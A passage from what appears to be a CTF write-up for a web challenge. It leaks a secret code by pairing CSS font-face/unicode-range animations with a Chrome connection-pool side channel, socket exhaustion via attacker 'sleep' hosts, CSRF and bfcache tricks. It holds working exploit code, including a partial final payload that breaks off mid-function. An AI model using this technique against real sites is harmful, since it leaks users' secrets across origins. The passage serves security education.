</span></span><span style="display:flex;"><span>    <span style="color:#f92672">src</span><span style="color:#f92672">:</span> <span style="color:#f92672">url</span><span style="color:#f92672">(</span><span style="color:#f92672">http</span><span style="color:#f92672">://</span><span style="color:#f92672">localhost</span>:<span style="color:#a6e22e">1337</span><span style="color:#f92672">/</span><span style="color:#f92672">2357283186</span>.<span style="color:#a6e22e">something</span><span style="color:#f92672">?</span><span style="color:#f92672">random</span><span style="color:#f92672">=</span><span style="color:#f92672">3305567327</span><span style="color:#f92672">),</span><span style="color:#f92672">url</span><span style="color:#f92672">(</span><span style="color:#f92672">http</span><span style="color:#f92672">://</span><span style="color:#f92672">localhost</span>:<span style="color:#a6e22e">1337</span><span style="color:#f92672">/</span><span style="color:#f92672">605747667</span>.<span style="color:#a6e22e">something</span><span style="color:#f92672">?</span><span style="color:#f92672">random</span><span style="color:#f92672">=</span><span style="color:#f92672">1840745527</span><span style="color:#f92672">),</span><span style="color:#f92672">url</span><span style="color:#f92672">(</span><span style="color:#f92672">http</span><span style="color:#f92672">://</span><span style="color:#f92672">localhost</span>:<span style="color:#a6e22e">1337</span><span style="color:#f92672">/</span><span style="color:#f92672">865462447</span>.<span style="color:#a6e22e">something</span><span style="color:#f92672">?</span><span style="color:#f92672">random</span><span style="color:#f92672">=</span><span style="color:#f92672">1135644699</span><span style="color:#f92672">),</span><span style="color:#f92672">url</span><span style="color:#f92672">(</span><span style="color:#f92672">http</span><span style="color:#f92672">://</span><span style="color:#f92672">localhost</span>:<span style="color:#a6e22e">1337</span><span style="color:#f92672">/</span><span style="color:#f92672">2122681983</span>.<span style="color:#a6e22e">something</span><span style="color:#f92672">?</span><span style="color:#f92672">random</span><span style="color:#f92672">=</span><span style="color:#f92672">1228559196</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">unicode-range</span>:<span style="color:#a6e22e">U</span><span style="color:#f92672">+</span><span style="color:#f92672">0042</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span></code></pre></div><p>An animation loop is used to try every character:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span>@<span style="color:#66d9ef">keyframes</span> <span style="color:#f92672">trychar_0</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">0</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">%</span> { <span style="color:#66d9ef">font-family</span>: <span style="color:#66d9ef">rest</span>; }
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">5</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">%</span> { <span style="color:#66d9ef">font-family</span>: has_A, <span style="color:#66d9ef">rest</span>; }
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">6</span>.<span style="color:#a6e22e">25</span><span style="color:#f92672">%</span> { <span style="color:#66d9ef">font-family</span>: <span style="color:#66d9ef">rest</span>; }
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">11</span>.<span style="color:#a6e22e">25</span><span style="color:#f92672">%</span> { <span style="color:#66d9ef">font-family</span>: has_B, <span style="color:#66d9ef">rest</span>; }
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">12</span>.<span style="color:#a6e22e">5</span><span style="color:#f92672">%</span> { <span style="color:#66d9ef">font-family</span>: <span style="color:#66d9ef">rest</span>; }
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Example: let&rsquo;s assume the code to leak is <code>B0B1B0</code>. To leak the first character of this code, the following CSS rule will be applied:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span>.<span style="color:#a6e22e">code-digit</span>:<span style="color:#a6e22e">nth-child</span><span style="color:#f92672">(</span><span style="color:#f92672">1</span><span style="color:#f92672">)</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">animation</span>: trychar_0 <span style="color:#66d9ef">step-end</span> <span style="color:#ae81ff">2</span><span style="color:#66d9ef">s</span> <span style="color:#ae81ff">0</span><span style="color:#66d9ef">s</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">animation-iteration-count</span>: <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">animation-delay</span>: <span style="color:#ae81ff">4</span><span style="color:#66d9ef">s</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now, in the <code>Network</code> tab of DevTools, you should now see 4 requests since the first character of the code is B, which was mapped to 4 requests. With the characters distinguishable from each other, it&rsquo;s now possible to count how many requests are sent by abusing the connection pool.</p>
<p>Here&rsquo;s a solution that works most of the time and is relatively fast:</p>
<ol>
<li>Block 255 sockets by sending requests to 255 different origins that will respond after a long delay (+70 seconds) (eg. <code>&lt;i&gt;.sleep.example.com</code>)</li>
<li>Block the last socket and keep its controller</li>
<li>send a fetch request</li>
<li>Wait until the first font request is made (in my exploit I wait 4 seconds)</li>
<li><code>controller.abort()</code> from step <code>2</code></li>
<li>Start sending fetch requests continuously (the exploit works even if you send requests to sleep.example.com or another host)</li>
</ol>
<p>Now, if everything is done correctly, this is what is going to happen:</p>
<ol start="7">
<li>Once the last socket is released, the request with the highest priority (the font request) will be processed first.</li>
<li>Afterward, the socket will be assigned to a request from step <code>6</code></li>
<li>This loop continues until all font requests are sent.</li>
<li>Once all font requests are processed, the request from step <code>3</code> will load. This means all fonts have been requested.</li>
<li>Finally, count how many fetch requests were sent from step <code>6</code>. The number of requests corresponds to the letter assigned to that character. For example, if 4 fetch requests are sent, the leaked letter will be <code>B</code>.</li>
</ol>
<style type="text/css">
     
    .notice {
        --title-color: #fff;
        --title-background-color: #6be;
        --content-color: #444;
        --content-background-color: #e7f2fa;
    }

    .notice.info {
        --title-background-color: #fb7;
        --content-background-color: #fec;
    }

    .notice.tip {
        --title-background-color: #5a5;
        --content-background-color: #efe;
    }

    .notice.warning {
        --title-background-color: #c33;
        --content-background-color: #fee;
    }

     
    @media (prefers-color-scheme:dark) {
        .notice {
            --title-color: #fff;
            --title-background-color: #069;
            --content-color: #ddd;
            --content-background-color: #023;
        }

        .notice.info {
            --title-background-color: #a50;
            --content-background-color: #420;
        }

        .notice.tip {
            --title-background-color: #363;
            --content-background-color: #121;
        }

        .notice.warning {
            --title-background-color: #800;
            --content-background-color: #400;
        }
    }

    body.dark .notice {
        --title-color: #fff;
        --title-background-color: #069;
        --content-color: #ddd;
        --content-background-color: #023;
    }

    body.dark .notice.info {
        --title-background-color: #a50;
        --content-background-color: #420;
    }

    body.dark .notice.tip {
        --title-background-color: #363;
        --content-background-color: #121;
    }

    body.dark .notice.warning {
        --title-background-color: #800;
        --content-background-color: #400;
    }

    .notice {
        --title-color: #fff;
        --title-background-color: #bd31bd;
        --content-color: #ddd;
        --content-background-color: #5d0269;
    }

    .notice.info {
        --title-background-color: #a50;
        --content-background-color: #420;
    }

    .notice.tip {
        --title-background-color: #363;
        --content-background-color: #121;
    }

    .notice.warning {
        --title-background-color: #800;
        --content-background-color: #400;
    }

     
    .notice {
        padding: 18px;
        line-height: 24px;
        margin-bottom: 24px;
        border-radius: 4px;
        color: var(--content-color);
        background: var(--content-background-color);
    }

    .notice p:last-child {
        margin-bottom: 0
    }

     
    .notice-title {
        margin: -18px -18px 12px;
        padding: 4px 18px;
        border-radius: 4px 4px 0 0;
        font-weight: 700;
        color: var(--title-color);
        background: var(--title-background-color);
    }

     
    .icon-notice {
        display: inline-flex;
        align-self: center;
        margin-right: 8px;
    }

    .icon-notice img,
    .icon-notice svg {
        height: 1em;
        width: 1em;
        fill: currentColor;
    }

    .icon-notice img,
    .icon-notice.baseline svg {
        top: .125em;
        position: relative;
    }
</style><div class="notice note" >
    <p class="notice-title">
        <span class="icon-notice baseline">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 128 300 300">
  <path d="M150 128c82.813 0 150 67.188 150 150 0 82.813-67.188 150-150 150C67.187 428 0 360.812 0 278c0-82.813 67.188-150 150-150Zm25 243.555v-37.11c0-3.515-2.734-6.445-6.055-6.445h-37.5c-3.515 0-6.445 2.93-6.445 6.445v37.11c0 3.515 2.93 6.445 6.445 6.445h37.5c3.32 0 6.055-2.93 6.055-6.445Zm-.39-67.188 3.515-121.289c0-1.367-.586-2.734-1.953-3.516-1.172-.976-2.93-1.562-4.688-1.562h-42.968c-1.758 0-3.516.586-4.688 1.563-1.367.78-1.953 2.148-1.953 3.515l3.32 121.29c0 2.734 2.93 4.882 6.64 4.882h36.134c3.515 0 6.445-2.148 6.64-4.883Z"/>
</svg>

        </span>Note</p><p>Further research led me to understand that there&rsquo;s another requirement to make this exploit work: the origin of the request sent in step <code>3</code> must be alphabetically higher than the origin of the requests sent in step <code>6</code>. Apparently, in this case, Chrome sorts the origins by their alphabetical value and processes the lower ones first. Additionally, if the origins are the same, Chrome will process the requests that came first.</p>
<p>This also works if a same-origin request is sent in step <code>3</code> (???)</p></div>

<!-- raw HTML omitted -->
<p>Example:</p>
<p>This will send the request in the step <code>3</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fetch_step_3</span>(<span style="color:#a6e22e">i</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// `http://zzzz${i}.${MYSERVER}/0?q=${i}` also works
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`/`</span>, {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This will send the requests in the step <code>6</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fetch_step_6</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">i</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">start</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">performance</span>.<span style="color:#a6e22e">now</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://aaaaa</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">MYSERVER</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/0?q=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now the requests will be loaded in the following order:</p>
<ul>
<li><a href="http://tester4.sleep.myserver.com/">http://tester4.sleep.myserver.com/</a> (step <code>6</code>)</li>
<li><a href="http://tester5.sleep.myserver.com/">http://tester5.sleep.myserver.com/</a> (step <code>6</code>)</li>
<li><a href="http://tester6.sleep.myserver.com/">http://tester6.sleep.myserver.com/</a> (step <code>6</code>)</li>
<li><a href="http://tester7.sleep.myserver.com/">http://tester7.sleep.myserver.com/</a> (step <code>3</code>)</li>
<li><a href="http://tester7.sleep.myserver.com/">http://tester7.sleep.myserver.com/</a> (step <code>3</code>)</li>
<li><a href="http://tester7.sleep.myserver.com/">http://tester7.sleep.myserver.com/</a> (step <code>3</code>)</li>
<li><a href="http://tester7.sleep.myserver.com/">http://tester7.sleep.myserver.com/</a> (step <code>6</code>)</li>
<li><a href="http://tester8.sleep.myserver.com/">http://tester8.sleep.myserver.com/</a> (step <code>3</code>)</li>
<li><a href="http://tester9.sleep.myserver.com/">http://tester9.sleep.myserver.com/</a> (step <code>3</code>)</li>
</ul>
<p>You can check the Connection ID to distinguish which request got the socket assigned first.</p>
<p><img src="/images/image-3.png" alt="alt text"></p>
<p>Let&rsquo;s run another test</p>
<p><img src="/images/image-4.png" alt="alt text"></p>
<p>You can see how the requests with the origin alphabetically lower will load first.</p>
<p><img src="/images/keeper-priority.gif" alt="alt test"></p>
<p>Now the last thing is putting everything together!</p>
<h2 id="putting-it-all-together">Putting it all together</h2>
<p><code>server1: zzzz${i}.server.com</code><br>
<code>server2: aaaa${i}.server.com</code></p>
<p>Here&rsquo;s what the exploit is going to do:</p>
<ul>
<li>Generate the CSS payload as described earlier</li>
<li>Open a popup to perform CSRF and set an arbitrary secret with the CSS payload</li>
<li>Open another popup</li>
<li>Use <code>window.history.go(-2)</code> to navigate back to the page with the bot code
<ul>
<li>The CSRF will modify the <code>session</code> cookie but the bot code will still remain in the bfcache</li>
</ul>
</li>
<li>In the previously popup now:
<ul>
<li>Create a hashmap,</li>
<li>Fill 255 sockets</li>
<li>Repeat the following for each character in the code:
<ul>
<li>Fill the 256th socket and Keep its controller</li>
<li>Send 5 fetch requests to <code>server1</code></li>
<li>Wait until the font requests are triggered</li>
<li>Release the 256th socket</li>
<li>Immediately start sending fetch requests to <code>server2</code> in a loop</li>
<li>Exit from that loop when a request to <code>server1</code> completes</li>
<li>The number of requests sent to <code>server2</code> corresponds to a certain character</li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<p>Ensure that each character is assigned enough requests. I noticed that the lowest character should be allocated at least 3 requests in order to leak it successfully.</p>
<!-- raw HTML omitted -->
<h3 id="poc">PoC</h3>


    
    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/f2tZomaJ3XQ?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"
      ></iframe>
    </div>

<p>You can download the exploit from <a href="https://github.com/salvatore-abello/web-challenges/tree/main/TRX%20CTF%202025/Keeper/exploit">here</a></p>
<h3 id="final-payload">Final payload</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">textarea</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;log&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width: 100%; height: 300px;&#34;</span>&gt;&lt;/<span style="color:#f92672">textarea</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">LOG</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Starting&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SOCKETLIMIT</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">255</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">MYSERVER</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`sleep.yourserver.test`</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">leaked_code</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">logtextarea</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;log&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sleep</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">ms</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">resolve</span> =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">ms</span>);
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">log</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">l</span>, <span style="color:#a6e22e">type</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;INFO&#39;</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">timestamp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Date().<span style="color:#a6e22e">toLocaleTimeString</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">prefix</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[!] &#39;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">type</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;SUCCESS&#39;</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">prefix</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[+] &#39;</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">type</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;FAILURE&#39;</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">prefix</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[x] &#39;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">logtextarea</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">`[</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">timestamp</span><span style="color:#e6db74">}</span><span style="color:#e6db74">] </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">prefix</span><span style="color:#e6db74">}${</span><span style="color:#a6e22e">l</span><span style="color:#e6db74">}</span><span style="color:#e6db74">\n`</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">logtextarea</span>.<span style="color:#a6e22e">scrollTop</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">logtextarea</span>.<span style="color:#a6e22e">scrollHeight</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fetch_sleep_long</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">i</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">controller</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">AbortController</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">signal</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">controller</span>.<span style="color:#a6e22e">signal</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://sleep</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">MYSERVER</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/120?q=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">signal</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">signal</span>
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">controller</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fetch_step_6</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">i</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">start</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">performance</span>.<span style="color:#a6e22e">now</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://aaaaa</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">MYSERVER</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/0?q=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">block_socket</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">i</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch_sleep_long</span>(<span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">exhaust_sockets</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span>() =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">SOCKETLIMIT</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">block_socket</span>(<span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Used </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> connections`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fetch_step_3</span>(<span style="color:#a6e22e">i</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// `http://zzzz${i}.${MYSERVER}/0?q=${i}` also works
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`/`</span>, {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">leak_char</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">hashmap</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;A&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;B&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;C&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;D&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;E&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">6</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;F&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">7</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;0&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">8</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;9&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">9</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;8&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">10</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;7&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">11</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;6&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">12</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;5&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">13</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;4&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">14</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;3&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">15</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;2&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">16</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;1&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">res_blocker_controller</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch_sleep_long</span>(<span style="color:#ae81ff">1337</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">50</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Starting step 3...`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fetch_step_3</span>(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
